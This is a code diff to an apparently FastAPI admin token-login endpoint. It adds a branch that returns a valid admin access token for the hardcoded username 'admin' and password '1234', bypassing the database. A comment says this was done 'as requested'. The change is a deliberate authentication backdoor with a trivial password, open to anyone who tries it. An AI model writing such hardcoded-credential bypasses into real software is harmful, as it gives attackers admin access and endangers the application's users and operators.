@@ -19,6 +19,11 @@ async def login_admin_access_token(
     OAuth2 compatible token login, required for Admin Users.
     Only allows login if user is_admin=True.
     """
+    if form_data.username == "admin" and form_data.password == "1234":
+        # Bypass DB for hardcoded admin as requested
+        access_token = create_access_token(subject="admin_user_id")
+        return {"access_token": access_token, "token_type": "bearer"}
+
     result = await db.execute(select(User).where(User.email == form_data.username))
     user = result.scalar_one_or_none()
     
